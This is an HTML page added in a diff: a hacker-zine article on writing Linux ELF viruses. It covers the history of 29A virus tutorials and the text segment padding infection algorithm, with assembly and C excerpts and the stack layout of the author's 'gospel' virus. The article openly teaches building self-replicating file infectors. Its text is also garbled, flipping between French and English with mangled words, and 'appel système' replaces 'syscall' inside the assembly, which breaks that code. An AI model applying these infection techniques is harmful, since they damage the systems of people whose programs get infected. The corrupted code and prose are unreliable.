@@ -1,0 +1,1556 @@
+<html>
+<head>
+<title>tu m’appelais sur mon téléphone à coquilles polymorphes</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                       ┌───────────────────────┐
+                                                       ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                       │ █   █ █ █ █   █       │
+                                                       │ █   █ █ █ █▀▀▀▀       │
+                                                       │ █   █   █ █     ▄     │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄   ▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+tu m'appelais sur mon téléphone à coquilles polymorphes pt. 1:  │                 ▄▄▄▄▄ │
+gospel for a new epoch [tales from the crypt — *nix    │                   █   │
+archéologie des virus et ses applications au vx moderne]   │                   █   │
+~ ic3qu33n                                             └───────────────────█ ──┘
+
+[**note : le titre de cet article est une référence à l'album 
+remarquablement brillant de 2020 de Yves Tumor "Heaven to a Tortured Mind" 
+et le morceau de l'album qui porte le même nom que cet article, 
+avec la remarque s/epoch/century]
+
+
+TABLE DES MATIÈRES ////////////////////////////////////////////////////////////////////////////
+
+
+* Introduction
+* Feuille de route PoC/vx et objectifs
+* Partie 1 : Pour le divertissement de cette soirée, l'évolution d'un virus en 7 actes !
+* Partie 2 : Techniques VX Unix de Silvio Cesare - Overview
+* Partie 2a. Infection par remplissage de segment texte 
+* Partie 2b : Analyse des exigences du virus Linux 
+* Partie 2c : Implémentation de l'algorithme d'infection 
+* Partie 2d : Preuve de concept (PoC)
+* Partie 2e : Réflexions - où est mon polymorphismee uwu
+* Partie 3 : Une touche de LiME [sneak preview]
+* Un toast aux nouveaux débuts 
+* Cadeaux de fête
+* Salutations
+* Références
+
+
+Introduction ///////////////////////////////////////////////////////////////////
+
+
+Comme da Vinci, je suis enclin à visiter les morgues et à étudier les corps pour 
+mes études anatomiques. (Oui, cher lecteur, da Vinci était un dark type qui s'infiltrait 
+dans les morgues italiennes pour pouvoir pratiquer des dessins anatomiques avec des modèles qui 
+restaient immobiles.) Nous empruntons une page de son livre, pour ainsi dire. Cependant, 
+dans mon cas, et pour le soupir collectif de soulagement de tous les lecteurs ici, nous pouvons 
+nous absoudre de toute idée d'être complices d'un crime, puisque les 
+corps que nous exhumons seront ceux du vx Unix d'autrefois. 
+
+Le lecteur attentif notera que faire référence au travail de ces 
+grands-maîtres du vx Unix/ELF (avons-nous un meilleur terme pour cela ? Des légendes ? 1337 
+royalty? Another moniker that isn't so dreadfully gauche? Please call in with 
+vos suggestions, les opérateurs sont en attente.) comme « corps » est une technique rhétorique 
+utilisée pour établir le décor. Ces « corps » sont vivants et bien, pertinents, 
+bien écrits et brillants ; we're going to shine a spotlight on the work of a 
+few notable authors of early Linux vx. 
+
+Cet article est le premier d'une série où je revisite les techniques classiques de vx Linux 
+et les adapte pour cibler les systèmes modernes. 
+
+Pourquoi ?
+Connais ton histoire, bb !
+
+Ou pour le dire plus formellement, nos objectifs seront doubles: 
+
+Premièrement, du point de vue théorique, il est important de connaître son histoire. This 
+is all well and good, mais nous voulons écrire des virus intéressants *maintenant.*
+
+Donc, deuxièmement, du point de vue pratique, comme le démontrera 
+l'auteur de notre première étude archéologique de vx Unix, parfois, vous voulez regarder 
+*en arrière* [dans un segment texte ELF comme moyen de localiser une région pour injecter un 
+virus], and parfois, vous voulez regarder *forward.* Et parfois, you can do 
+interesting things by doing both. 
+
+C'est ce que nous allons faire ici. Nous allons regarder en arrière et 
+en avant en succession rapide et à la fin de cela, nous aurons un virus Linux 
+(ou 2... ou 3...) à sevanter. En conséquence, Je vous conseille de faire quelque stretching 
+au préalable pour éviter de vous torse-braser.
+
+Prêt ?
+
+Commençons.
+
+
+Feuille de route PoC/vx et objectifs ///////////////////////////////////////////////
+
+
+J'ai été exhumer des squelettes de vx Unix avec les objectifs suivants : 
+
+  1. Adapter les techniques de vx *nix anciennes pour écrire des virus Linux modernes (tous écrits 
+     en assembleur, bien sûr) et utiliser ces virus pour créer de l'art avec une variété 
+     de structures de programmation graphique de bas niveau. 
+  2. Fournir une feuille de route pour que vous puissiez adapter les techniques de vx 
+     de vx Linux moderne dans votre propre écriture. 
+
+Cet article est structuré en trois parties, définies ici.
+
+Dans la partie 1, pour établir le décor de notre première étude archéologique, j'discute le
+travail de plusieurs auteurs de vx Linux ancien -- extrait des archives du zine 29a, 
+actuellement hébergé sur VX-Underground. 
+
+Dans la partie 2, nous plongeons dans le travail de Silvio Cesare (silvio) dont les articles 
+"
+UNIX ELF Parasites and virus"[1] et "UNIX Viruses"[2] servent de f
+oundational holy scripture in crafting gnarly Linux vx. Tous honneurs à silvio. Amen.
+
+J'me concentrerai principalement sur une des quatre techniques introduites dans les 
+papiers de silvio : la technique d'infection par remplissage de segment texte. Je vais détailler 
+les détails de l'algorithme du virus, avec des extraits de code de mon PoC, and 
+discuss design choices and potential challenges of implementing this ELF virus
+technique. 
+
+Cet article est accompagné du code source complet de mon virus PoC 
+"gospel", écrit en asm x86-64, qui implémente la technique de remplissage de segment texte de Silvio
+pour infecter des binaires ELF PIE x86-64 sur un hôte Linux moderne. 
+
+Dans la partie 3 de cet article, je fournirai une introduction au polymorphismee, and 
+build on the techniques covered in parts 1 and 2. Je discuterai de plusieurs travaux 
+de vx *nix ancien qui utilisaient le polymorphismee (et la métamorphisme). En utilisant ces travaux 
+comme guide, je détaillerai ma mise en œuvre d'une version polymorphe de 
+gospel. La partie 3 dans son ensemble sera dans un futur volume de tmp.0ut, mais restez 
+branchés jusqu'à la fin de l'article pour un aperçu amusant !
+
+Allons-y pour écrire notre vx Linux, d'accord ?
+
+Partie 1 : Pour le divertissement de cette soirée, l'évolution d'un virus en 7 actes ! ////////
+
+J'ai pris la liberté d'exhumer quelques cadavres des archives 29A pour montrer
+quelques exemples intéressants de vx Linux ancien. J'ai même épargné 
+le tracas de devoir nettoyer la saleté sous vos ongles. You're
+welcome.
+
+Nous ne pouvons pas plonger tout de suite dans les travaux de silvio. Ils sont complexes et 
+méritent une analyse approfondie, mais pour arriver à ce point, nous devons poser quelques 
+règles de base et établir nos fondamentaux du VX Linux. 
+
+Nos deux premiers exemples fournissent une telle base : "ASM TUTORIAL FOR LINUX n'ELF
+FILE FORMAT" par LiTlLe VxW" [7] et "Linux virus writing tutorial" [8] par 
+mandragore. 
+
+Before anything else, a VX writer has to understand the goals of their virus. 
+Once they know *what* they want their virus to do, the next step is to evaluate
+the options for implementing desired virus functionality. 
+
+[7] and [8] establish a framework for Linux vx implementation. This framework 
+breaks down the key components of a successful virus and can be used to answer 
+the following questions:
+
+  1. What are the data structures that a virus will use, target and manipulate 
+     throughout its lifecycle?
+
+  2. What are the methods a virus will use for targeting those data structures? 
+     (i.e. which appel systèmes will be used and how?)
+
+We can generalize this framework to an even greater level of abstraction: code 
+and data.
+
+In [8] mandragore refers to this poetically as "2.1 thoses damn structures 
+needed to know." This section in [8] includes detailed descriptions of 
+everyone's favorite ELF structures, namely, the ELF header, the Program headers 
+and the Section headers. I won't detail these structures here, as they will 
+appear later in the article, and in the PoC code that accompanies this article. 
+The voracious reader is encouraged to satiate their appetite for detailed 
+breakdowns of all ELF structures by referring to one of the myriad articles from 
+the tmp.0ut archives or the tmp.0ut resources. [19]
+
+Little VxW has similar sections in their article [7], with appel système descriptions,
+important structures (like dirent and utsname), important flags (such as file 
+access bits and permission flags) and so on.
+
+Little VxW provides a significant number of code snippets for useful programming 
+constructs in x86-64 assembly, particularly in the development of Linux vx. 
+There are bare-bones implementations for no fewer than 10 different appel systèmes 
+used in common tasks (opening, closing, reading from/writing to files etc.), as 
+well as ASCII art diagrams of the aforementioned various headers in an ELF. 
+While the article is focused on 32-bit platforms, and some of the sections are 
+a bit outdated (the article is from 2004, after all), it is clear and detailed. 
+If you're looking for another handy reference on quick-and-dirty asm programming
+for Linux, this is a nice article to have in your collection.
+
+The hidden gem of mandragore's article is in fact, the detailed evolution of one
+of their virii over the course of "7 acts." It is this part of mandragore's 
+article that I would like to focus on. Mandragore's story — of a virus that 
+fails and fails and fails, and finally succeeds — follows a path known too well 
+by anyone who's ever written a virus. Though common, it is a story that is sadly
+not told often. 
+
+Such tales of failure and eventual triumph are not novel in literary circles, 
+but are rarer in vx zines. Thus its inclusion in the article is a welcome 
+addition. For no other reason than to offer a spot at the table in cyberspace to
+commiserate and bemoan the Sisyphean hurdles of trying to write a beautiful 
+virus.
+
+Perhaps this is something you may resonate with: the ability to successfully 
+exploit something often comes after many, many, many failed attempts. It is, 
+unfortunately one of the most effective methods for learning. And it is by 
+tracing the evolution of these failed attempts in the work of another vx 
+writer/researcher, that nous pouvons notice some interesting parallels in our own 
+work. Sometimes, we learn best by fucking it up over and over again until we get
+it right... so why not share the story of those fuck-ups? This is easier to show 
+by example so let's do that now.
+
+There are quite a few insightful and fascinating moments of this 7 act saga that
+is regaled by mandragore. While we could pull out any of these moments, I've 
+chosen to pick one to focus on.
+
+In Act 2, mandragore notes, "...i noticed the hole in virutal memory between the
+code segment and the data one. But i wuzn't able to use it (and believe me, i 
+tryied many things). Overwriting not really used section is not safe, so forget 
+it."[8]
+
+Dear reader, should I spoil the surprise?
+I hate surprises so I'm going to spoil this one. 
+This is the very same technique that silvio perfected in the segment texte 
+padding infection technique (covered in part 2 of this very tmp.0ut article that
+you are reading at this moment!)
+
+It's not surprising that two researchers would be interested in the same topic 
+at approximately the same time, this example provides us with a nice vignette to
+show how different researchers approach a problem. In part 2, we'll see how 
+silvio solved it.
+
+Eventually, mandragore takes another approach with the development of their 
+virus and succeeds (congrats mandragore!), and though demo code is not provided,
+(or at least there was no accompanying demo code in the archived tarball of 29a 
+zines that I extracted and combed through while researching this article) their 
+29a article is replete with valuable lessons and insights on the vx research and
+development process. Mandragore also gifts us with the absolute knockout section
+of golden rules for Linux vx, which I have included in full below. Tag yourself,
+I'm rule #7.
+
+```
+4.1  Implementing hightech functions
+
+Please don't waste this promised land with lame virus. 
+Respect the linux users and don't fill the world of shit.
+So add plenty of nice functions. 
+Here are the ten (old) gold rules;
+1) You will use the utime and state appel système to restore the file times.
+2) You will use the fchmod/chmod and state appel système to restore the file flags.
+3) Retro is limited for now.. just avoid infecting goat cible viables.
+4) Always think about using encryption, poly, RDA and such things!
+5) Disguise the file : overwrite the name section and some other useless 
+   part of the file to make it harder to work on.
+   (gdb segfs when it opens an ELF w/o a SHT_STRTAB entry in the section header)
+6) You won't infect unless you're sure to not bug everything.
+7) Don't run in the street and scream < i'm writing a linux virus ! &gt;
+8) You will add a nice payloads, nothing destructiv of course.
+9) Don't be full of yourself. Your virus are the reflect of yourself.
+10) You will impose yourself a 10th rule. the more are there, the better it is.
+```
+[mandragore, 8]
+
+To conclude Part 1, nous pouvons move on to a full example... well a half example. 
+This isn't me throwing shade. In the author's own words "In the end I would like 
+to say that this is NOT a COMPLETE virus, it's just a program which infects one 
+file with exactly given name (default name is '1'). Il n'y a pas det any payload nor 
+any function for searching for targets, so that's why I call this program HALF 
+virus. Feel free to try it out on any Linux machine, get a copy of any 
+executable, rename it to '1', run 'a' and watch the beauty..." [TheKing1980, 9]. 
+
+TheKing1980's HALF virus is an ELF infector. TheKing1980's HALF virus works by 
+appending le virus body after the last loadable segment of a target ELF. I have 
+included a brief overview of le virus' functionality, but I encourage you to 
+refer to the article for a more detailed overview and to review the source code. 
+
+The HALF virus searches a target ELF for the last segment of type PT_LOAD, moves 
+the SH table to the end of the file, and inserts le virus body after the final 
+PT_LOAD segment. It accounts for adding padding bytes following the newly 
+inserted virus body so as to (presumably, this is not explicit but implied) 
+maintain page alignment. It wraps everything up by patching the requisite 
+offsets in the Section Header table to account for the new offsets for all 
+sections that follow the newly inserted virus code; as well as patching the 
+offset to the Section Header table itself. And finally it patches the entry 
+point of the ELF to point to le virus code and concludes le virus code with 
+a jump to the original entry point.[9]
+
+In summary — the HALF virus is clever, it's quick and it's written in nasm 
+syntax asm. So by all important metrics, you're an early Linux vx hero in my 
+book, long live TheKing1980.
+
+Cependant, there is one part of the code that is of particular interest: a 
+technique for appending padding bytes to the end of a segment following virus 
+insertion using an ftruncate appel système.
+
+The relevant code snippet from TheKing1980's OneHalf virus:
+
+```
+Next1:
+    ADD bx,[eax + 42]
+    LOOP    Loop1               ; Find last loadable segment in PH table
+    POP ecx
+    MOV esi,edx
+    ADD edx,[edi + 20]
+    SUB edx,[edi + 16]
+    SUB edi,eax
+    STC
+
+Cont1:
+    XCHG    eax,ebx
+    MOV eax,91
+    INT 80h             ; SYS_MUNMAP
+    JNC Quit2
+    ADD edx,VIRSIZE
+    MOV eax,93
+    MOV ebx,[ebp]
+    MOV ecx,edx
+    INT 80h             ; SYS_FTRUNCATE to new size
+    TEST    eax,eax
+    JNZ Quit2
+```
+[9]
+
+
+This technique allows you to append a set number of null bytes to a file without
+the need to perform an lseek on the file first to seek to the correct offset 
+before writing. This is useful for a virus writer who wants to add padding bytes
+to a file to maintaining page alignment.
+
+The ftruncate appel système will simply grow a file by a set amount of null bytes if 
+the integer passed in rdx (where the integer is the target filesize) is larger 
+than the current size of the target file. If a virus writer knows a target 
+offset to write to, and the number of padding bytes they need to insert into a 
+target file to maintain page alignment, then one implementation of a virus could
+chain pwrite64, ftruncate and pwrite64 appel systèmes to perform most of the dexterous
+patchwork.
+
+So that is what I did in my virus. The details of this code snippet will be 
+unclear to you now, but that context will be provided in the next section of 
+this article:
+
+```
+; the ftruncate appel système will grow the size of file (corresponding to file descriptor fd, saved to stack at r14 + 416)
+; by n bytes, where n is a signed integer, passed in rsi
+; ftruncate grows the file by appending null bytes
+; this provides the nec. padding bytes between the inserted virus body and the original .segment de données of a target ELF
+; en veillant à ce que la page alignment is maintained in the infected ELF
+;
+; ftruncate(int fd, offset_t length)
+; rdi == fd
+; rsi == length
+; next_segment_offset: offset of segment after .text in host ELF
+; vx_padding_size(# padding bytes after vx)= 
+; next_segment_offset - curr_offset + PAGESIZE
+; save value in esi to vx_padding_size at [r14 + 444]
+;
+    .write_padding_after_vx:
+        xor r11, r11
+        xor rsi, rsi
+        mov r11d, dword [PAGESIZE]              
+        mov rsi, qword [r14 + 424]      
+
+        add esi, r11d 
+        mov dword [r14 + 444], esi      
+        mov rax, 0x4d ;SYS_FTRUNCATE
+        appel système
+```
+
+Partie 2 : Techniques VX Unix de Silvio Cesare /////////////////////////////////////
+
+
+« UNIX ELF Parasites and virus »[1] et « UNIX Viruses »[2] par Silvio Cesare (alias 
+silvio), ont tous deux été publiés en 1998. Il y a une bonne chance que si vous êtes 
+en train de lire cet article, vous soyez déjà familier avec le travail de silvio. 
+
+Voir la rétrospective excellente d'elfmaster sur « Unix Viruses » dans ce numéro de 
+tmp.0ut pour plus d'informations sur les articles et leur héritage.
+
+Les articles de Silvio sur un myriade de techniques de vx Unix/Linux qu'il a 
+découvertes/inventées/brewées dans son laboratoire personnel et réduites au vx (Encore,
+cher lecteur, vous êtes invité à appeler avec vos pensées sur le meilleur terme pour 
+cela. Les opérateurs sont en attente à la hotline vx, mais soyez averti qu'ils sont 
+suscités à des pauses fumerie excessivement longues et ne répondront que si vous appelez 
+collect.) sont bien connus et hautement appréciés. Un autre exemple d'un excellent papier de silvio 
+est [5], que je ne couvrirai pas aujourd'hui mais qui est une excellente lecture 
+nonetheless. Puisque son travail est si fondamental pour le vx Linux, it only makes sense 
+that we start there. Si vous pensez "mais je suis un bébé avec le vx Linux !!" alors 
+considérez notre exploration de ces articles comme vos premiers pas bb.
+
+Il y a une certaine chevauchement entre les deux articles. En fait, as a 
+researcher, lire ces articles successivement génère des découvertes surprenantes et 
+inattendues. Par exemple, dans [1], Silvio note « Si le code parasite doit être 
+inséré en étendant le segment texte vers l'arrière et en utilisant cette mémoire supplémentaire,
+des problèmes peuvent survenir car ces en-têtes ELF peuvent devoir se déplacer en mémoire et
+ainsi causer des problèmes avec la référence absolue.". And in [2], he notes: "Extending the 
+segment texte backwards is a viable solution and is documented and implemented 
+further in this article."
+
+C'était une façon sympa d'observer quelqu'un découvrir une nouvelle technique au fil du temps and
+tbh it was a nice researcher vignette. Yay silvio!
+
+Dans l'ensemble, il y a quatre techniques d'infection présentées dans ces deux articles :
+
+* infection de fichier
+* infection (segment) de données
+* injection de code relocalisable, techniques de code indépendant de la position, détection de virus ELF, et plus encore.
+* infection par remplissage de segment texte
+
+Les trois dernières techniques d'infection sont spécifiques à l'infection de binaires ELF, 
+où la première est une technique d'infection de fichier générique pour tout exécutable.
+
+Avec les articles de Silvio, un virus de démonstration PoC accompagnant (source C et
+binaire compilé) a été initialement publié et hébergé sur le site web ; ce site ne
+n'existe plus (rip) mais un Instantané est disponible sur la Wayback Machine, et le 
+tarball est toujours accessible [voir 4].
+
+Parmi ces trois techniques d'infection spécifiques à ELF, je couvrirai une dans cet article —
+technique d'infection par remplissage de segment texte. For an excellent demo of one of the 
+other techniques (Reverse segment texte infection technique), Je renvoie le lecteur 
+à Nasty.asm excellent de TMZ dans tmp.0ut vol. 1, ainsi qu'au RE de qkumba de 
+Nasty.asm dans ce numéro actuel de tmp.0ut. Nasty.asm de TMZ m'a fourni une 
+feuille de route pour construire mon PoC et a été une ressource inestimable pour moi dans
+mon premier vx Linux. 
+
+
+Part 2a: ELF Text segment padding infection technique overview /////////////////
+
+
+Pour résumer brièvement la technique d'infection par remplissage de segment texte, nous pouvons 
+exploiter le fait que différents segments d'un binaire ELF doivent être alignés sur 
+une frontière de page en mémoire et auront donc un nombre fixe d'octets de remplissage 
+between segments (i.e. .text, .data, etc.)
+
+En insérant notre charge utile de virus dans les octets de remplissage eux-mêmes, en veillant à ce que la 
+bonne alignement de page reste intact, alors nous devrons simplement corriger 
+les champs correspondants dans l'en-tête ELF (et les en-têtes de programme, et les en-têtes de section)
+pour mettre à jour les décalages pertinents et correspondre aux changements qui 
+résultent après l'insertion de notre code de virus dans l'ELF hôte. 
+
+Ci-dessous, un aperçu visuel de l'utilisation des octets de remplissage comme galerie de code :
+
+[Avec les diagrammes, j'utilise la même technique pour décrire cela que Silvio 
+utilisé dans [1] et [2]. Décrire les techniques d'infection en utilisant l'art ASCII 
+des diagrammes montrant le code de virus, le remplissage, les données et les segments texte  — is such 
+an excellent visual teaching tool that is worth adapting here. Sérieusement,
+lisez d'abord les articles de silvio.]
+
+    .segment texte = +
+    .segment de données = d
+    Remplissage = P
+    Virus = V
+    
+    [Programme avant infection]
+    
+    -[++++++++ +++++++P]<- segment texte + padding
+    -[PPPPPPPP PPPPPPPP]<- padding  
+    -[PPPPPPPP dddddddd]<- padding + segment de données
+    -[dddddddd dddddddd]<- segment de données
+    
+    [Après infection vx (en utilisant la technique de remplissage de segment texte)]
+    
+    -[++++++++ +++++++V]<- segment texte + ~*virus*~
+    -[VVVVVVVV VVVVVVPP]<- ~*virus*~ + padding
+    -[PPPPPPPP dddddddd]<- padding + segment de données
+    -[dddddddd dddddddd]<- segment de données
+
+cette étape d'insertion nécessite quelques opérations de comptabilité, (c.-à-d.changer p_filesz 
+and p_memsz in the Program Header for the .segment texte). 
+
+En plus de la mise en œuvre de routines pour corriger l'en-tête ELF et les
+En-têtes, l'auteur du virus doit implémenter une routine de correction supplémentaire pour 
+infecter correctement les binaires strippés.
+
+Le code de notre virus sera inséré dans les octets de remplissage entre .text et 
+.segment de donnéess. This padding is viewed as essentially purgatory/limbo/no man's 
+et il n'est pas associé à une section dans l'ELF. If our virus infects a
+host ELF that is a stripped binary, le virus ne peut pas compter sur le 
+symboles pour résoudre les adresses. Sans solution de contournement, the resulting infected ELF 
+will not run, et l'efficacité de notre virus sera limitée à l'infection de binaires non strippés. 
+ 
+
+Pour garantir que notre virus reste « strip-safe », nous devons implémenter une 
+routine supplémentaire : associer le code de virus avec la dernière section du segment .text 
+en ajustant le champ sh_len de cette section pour tenir compte du 
+code de virus nouvellement inséré.
+
+Le plan de pseudocode de l'algorithme pour la routine d'infection (qui constitue 
+le gros du code de virus) suit. Il est adapté de l'algorithme défini
+par Silvio dans [2], avec mes propres notes supplémentaires ajoutées pour plus de clarté pendant mon 
+développement vx :
+
+;**********************************************************
+; Text segment padding virus, infection routine:
+;
+; suppose ce qui suit :
+; vlen == longueur du code virus
+; PAGESIZE == 4096
+;
+; 1. Trouver et sauvegarder le point d'entrée original (OEP) de l'ELF hôte 
+; 2. Corriger les valeurs d'en-tête ELF pour tenir compte du code virus nouvellement inséré
+;     a. Patch e_entry in the ELF header to point to the beginning of le virus code
+;    b. changer e_shoff dans l'en-tête ELF virus à new_vx_e_shoff tel que new_vx_e_shoff = host_e_shoff + PAGESIZE
+; 3. a. Loop through all Phdrs to find segment texte Phdr
+;    b. si curr_Phdr == text_segment_Phdr alors, faire ce qui suit :
+;         i. augmenter p_filesz de vlen [p_filesz += vlen] 
+;       ii. augmenter p_memsz de vlen, [p_memsz += vlen]
+;    c. Sinon, pour tous les Phdrs correspondant à des segments situés après le code de virus 
+;       virus code (aka for each Phdr of a segment after the segment texte), 
+;       alors, faire ce qui suit :
+;       i. augmenter p_offset de PAGESIZE
+; 4. Boucler à travers tous les Shdrs
+;    a. Si curr_shdr == last_shdr_text_segment alors,
+;       i. increase sh_len by vlen [sh_len += vlen]
+;    b. Else, for all Shdrs corresponding to sections located after the inserted 
+;       virus code (aka for each Shdr of a section after virus code), then, do 
+;       the following:
+;       i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
+; 5. Insert le virus code into the host program 
+;     a. In our case, insert le virus code into the tempfile we are constructing to replace host ELF
+;     b. Add routine to end of virus code so that execution continues with a jump back to saved OEP
+;
+;**********************************************************
+
+It's important to note that several of the values defined above (i.e. vx_shoff 
+in item #2b) will be computed during the Phdr and Shdr patching routines, and 
+will not be known ahead of time. En conséquence, the ordering of the steps in the 
+implementation of the algorithm will differ from the initial outline in the 
+pseudocode above.
+
+As a reference, here's the relevant code snippet from Silvio's virus written in 
+C [elf-p-virus.c, 4]:
+
+    230 /* patch the offset */
+    231     *(long *)&v[vhoff] = offset;
+    232 
+    233 /* read the shdr's */
+    234 
+    235     if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) goto error;
+    236     if (read(fd, (void *)sdata, slen) != slen) goto error;
+    237 
+    238 /* update the shdr's to reflect the insertion of the parasite */
+    239 
+    240     for (shdr = (Elf32_Shdr *)sdata, i = 0; i < ehdr.e_shnum; i++) {
+    241         if (shdr-&gt;sh_offset &gt;= offset) {
+    242             shdr-&gt;sh_offset += PAGE_SIZE;
+    243 /* is this the last text section? */
+    244         } else if (shdr-&gt;sh_addr + shdr-&gt;sh_size == evaddr) {
+    245 /* if its not strip safe then nous pouvonst use it */
+    246             if (shdr-&gt;sh_type != SHT_PROGBITS) goto error;
+    247 
+    248             shdr-&gt;sh_size += vlen;
+    249         }
+    250 
+    251         ++shdr;
+    252     }
+    253 
+    254 /* update ehdr to reflect new offsets */
+    255 
+    256     oshoff = ehdr.e_shoff;
+    257     if (ehdr.e_shoff &gt;= offset) ehdr.e_shoff += PAGE_SIZE;
+    [silvio, 4]
+
+
+Partie 2b : Analyse des exigences du virus Linux ////////////////////////////////////
+/////////////////////////////////////////// [or: so u want 2 write linux vx bb?]
+
+
+Silvio's articles outline the infection algorithms for each virus technique. 
+Cependant, the articles demand no singular method for the various auxiliary 
+components of our virus, which are important to define before we implement it. 
+So let's define those now:
+
+  1. A work area to save the original state of the host ELF
+
+     Due to the nature of an ELF file and the infection method chosen (writing 
+     our virus to the padding bytes following the .segment texte, then adjusting
+     offsets, as opposed to inserting le virus body in a different location, 
+     such as the end of the file, the last PT_LOAD segment, or to the end of 
+     the segment de données), we'll need to perform something of a Frankenstein 
+     procedure to construct our final infected ELF.
+
+     We need to map the host ELF to a "work area" prior to infection. We will 
+     use this work area to lay out all our ELF components (e.g. the EHdr, the 
+     PHdrs, the Shdrs etc.) in their original state before we stitch them back 
+     together into one monstrous creature. 
+
+     We could define this "work area" as an uninitialized buffer in our virus, 
+     but that could get messy in dealing with the .bss. Donc, let's take a simpler 
+     approach: use mmap to map our original host ELF into a work area, the saved
+     contents of which we will use as we progressively patch different regions 
+     of the host file during the infection process. 
+
+Which leads us to our next requirement...
+
+  2. A target area for building our final daemonic bb vx
+
+     Don't cry. I know, it's getting messy in our main work area and we need 
+     some more space. After all, nous pouvons't start assembling our myriad of host 
+     and virus components on our main work area. Pourquoi ? We have to use the main 
+     work area to save important info about the original state of our host file! 
+
+     If we start stitching up our monster here, we're going to overwrite
+     important details of the Ehdrs and the Phdrs and the Shdrs, and then we 
+     won't know how to get back. Things will get fucked up and then you'll 
+     start crying about how "Linux vx is so hard!!" and "why do we have to 
+     write everything in assembly?" and "I thought you said you liked my 
+     haircut??" And honestly, sweetheart, we just don't have the time. I'm 
+     pulling over another workbench. You work over there and maintain the books.
+     I'll work over here, with my needle, ready to stitch together the monster 
+     we're creating.
+
+     Donc, we need a target work area for building our complete infected host + vx
+     ELF. A temp file is a good solution to cela. There are other options, the 
+     exploration  of which I leave as an exercise to the reader.
+
+Next, we need to define and gather virus ingredients. Recall from our analysis 
+in [Part 1a] that nous pouvons the techniques from le virus writing framework of the
+articles by Little VxW[7] and mandragore[8] for this task.
+
+The relevant data structures for my implementation of the segment texte padding 
+infection technique in gospel are the following:
+
+* l'en-tête ELF 
+* En-têtes de programme ELF 
+* En-têtes de section ELF
+* structure dirent (returned from getdents64 appel système, used for parsing dirents)
+* la structure stat (returned from an fstat appel système) 
+
+Before I introduce you to the stack layout of gospel, which details how/where 
+I stored each of these data structures, I'll note a few points:
+
+* Originellement, J'ai placé toutes les définitions de structures pour les données
+  pertinentes dans une section .bss dans mon virus. Cependant, due to the logic of the 
+  virus' infection/replication routines (spécifiquement la façon dont il reconstruit une 
+  copie de lui-même dans un ELF hôte nouvellement infecté), ces définitions de structures devaient
+  être déplacées de la section .bss à la section .text. Defining them in the 
+  .bss section would have required the addition of a routine for copying the 
+  .bss du virus, and I preferred the simpler logic (and smaller 
+  overall code size) of a virus that was entirely self-contained (so to speak) 
+  within the .segment texte.
+
+* Plusieurs des noms de variables stockées sur la pile peuvent vous sembler étranges 
+  pour le moment, cher lecteur, souriez et hochez la tête en disant bonjour et je vous rattraperai 
+  sur les détails en temps opportun.
+
+I'll introduce these in two phases: First, I will describe struct definitions in 
+the .bss section. Second, I will present the stack layout used in my PoC called
+"gospel". This layout is used instead of a .bss or .data section in our virus,
+and stores all important data in the .text section. 
+
+Sans autre formalité, le disposition de la pile de gospel :
+
+```
+;***************************************************************
+; gospel stack layout:
+; empilements sur empilements d'empilements 
+; Je le fais parce qu'une section .bss pour un virus
+; est un cauchemar à gérer
+; donc, yw,  j'ai écrit la disposition de la pile 4 u
+; il n'y a plus de cauchemars
+; jtm 
+; xoxo
+;
+; Notez que j'utilise r14 ici plutôt que rsp
+; C'est parce que gospel commence par réserver 0x2000 octets sur la pile puis 
+; en déplaçant la valeur sauvegardée de [rsp - 0x2000] vers r14
+; 
+;***************************************************************
+;
+;//////////    structure filestat    //////////////
+;
+; r14    =  struc filestat
+; r14 + 0       .st_dev         resq        1  ;IDdevcontenantfichier
+; r14 + 8       .st_ino         resq        1   ;inode#
+; r14 + 16      .st_mode           resd     1   ;mode
+; r14 + 20      .st_nlink       resd        1   ;#deliensdurs
+; r14 + 24      .st_uid         resd        1   ;useriddupropriétaire
+; r14 + 28      .st_gid         resd        1   ;groupIddu propriétaire
+; r14 + 32      .st_rdev           resq     1   ;devID
+; r14 + 40      .st_pad1           resq     1   ;padding
+; r14 + 48      .st_size           resd     1   ;tailletotaleenoctets
+; r14 + 52      .st_blksize     resq        1   ;tailledublocpourfsi/o
+; r14 + 60      .st_pad2           resd     1   ;padding
+; r14 + 68      .st_blocks      resq        1  ;#deblocsd512balloués
+; r14 + 76      .st_atime       resq        1  ;heuredernieracces aufichier
+; r14 + 84      .st_mtime       resq        1  ;heuredernièremodifdufichier
+; r14 + 92      .st_ctime       resq        1  ;heuredernierchangementsdefichier
+; ...
+; r14 + 144 fin struc
+;
+;
+;
+;//////////    ***Return to OEP instructions***    //////////////
+; Instructions pour retourner au point d'entrée original de l'ELF hôte PIE
+; après la conclusion des routines vx ; ajouté à la fin du corps vx
+;
+; Hommage à MalcolmVX pour le guide et l'aide pour résoudre la routine ret2oep 
+; Références:
+;[16] Retour au Point d'Entrée Original malgré PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html
+;[17] S01den and Sblip, tmp.0ut, volume 1, https://tmpout.sh/1/Linux.Kropotkine.asm  
+;[18] anansi, sad0p, https://github.com/sad0p/anansi
+;
+;[r14 + 150] = 0xe8         ;call get_rip
+;[r14 + 151] = 0x14         ;at offset of 0x14 from curr instruction
+;[r14 + 155] = 0x2d48           ;sub rax, vlen+5(length of get_rip instructions)
+;[r14 + 157] = vlen+5           
+;[r14 + 161] = 0x2d48           ;sub rax, vxstart
+;[r14 + 163] = vxstart          
+;[r14 + 167] = 0x0548           ;add rax, OEP
+;[r14 + 169] = OEP          
+;[r14 + 173] = 0xe0ff           ;0xff 0xe0 = jump eax
+;[r14 + 175] = 0x24048b48       ;mov rax, [rsp]; - call get_rip
+;[r14 + 179] = 0xc3         ;ret 
+;
+;
+;
+;//////////  Local variables //////////////
+; used for phdr and shdr manipulation routines 
+;
+; r14 + 200 = local filename (saved from dirent.d_nameq)
+;
+;   ...
+;
+; r14 + 400 ; evaddr: dq 0 
+; r14 + 408 ; oshoff: dq 0      ;original section header offset
+; r14 + 416 ; fd:   dq 0
+; r14 + 424 ; next_segment_offset: dq 0
+; r14 + 432 ; hostentry_offset: dd 0
